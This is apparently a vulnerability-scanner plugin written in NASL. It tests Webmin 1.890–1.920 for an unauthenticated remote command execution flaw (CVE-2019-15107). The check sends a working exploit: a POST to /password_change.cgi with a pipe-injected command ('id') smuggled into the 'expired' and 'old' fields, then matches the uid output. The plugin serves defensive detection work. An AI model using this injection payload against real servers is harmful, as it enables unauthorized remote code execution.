#
# (C) WebRAY Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(127911);
  script_version("1.2");
  script_cvs_date("Date: 2019/08/20 15:31:25");

  script_cve_id("CVE-2019-15107", "CVE-2019-15231");

  script_name(english:"Webmin 1.890 - 1.920 Remote Command Execution (CVE-2019-15107, CVE-2019-15231)");
  script_summary(english:"Attempts to exploit webmin to execute commands.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Webmin install hosted on the remote host is affected by a remote command execution vulnerability. A remote,
unauthenticated attacker and exploit this to execute arbitrary commands on the remote host.");
  script_set_attribute(attribute:"see_also", value:"http://www.webmin.com/changes.html");
  script_set_attribute(attribute:"solution", value:"Update to webmin 1.930 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-15231");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/08/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/08/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/08/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:webmin:webmin");
  script_set_attribute(attribute:"exploited_by_GizaNE", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019 and is owned by WebRAY, Inc. or an Affiliate thereof.");

  script_dependencies("webmin.nasl");
  script_require_keys("www/webmin");
  script_require_ports("Services/www", 10000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

app = 'Webmin';

port = get_http_port(default:10000, embedded: TRUE);

get_kb_item_or_exit('www/'+port+'/webmin');

install_url = build_url(port:port, qs:"/");

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

item = "/password_change.cgi";
data = "user=root&pam&expired=2|" + cmd + "&old=GizaNE|" + cmd + "&new1=GizaNE&new2=GizaNE";

res = http_send_recv3(
  method:"POST",
  port:port,
  item:"/password_change.cgi",
  add_headers:make_array('Referer', install_url),
  data: data,
  exit_on_fail: TRUE
);

if (res[2] !~ cmd_pat)
  audit(AUDIT_LISTEN_NOT_VULN, app, port);

result = data_protection::sanitize_uid(output:res[2]);

report += 'The following request was sent to the server :\n\n';
report += crap(data:"=", length:70)+'\n';
report += http_last_sent_request()+'\n';
report += crap(data:"=", length:70)+'\n\n';
report += 'Which returned the following result : \n\n';
report += res[0] + res[1] + result;

security_report_v4(
  port: port,
  severity: SECURITY_HOLE,
  extra: report
);

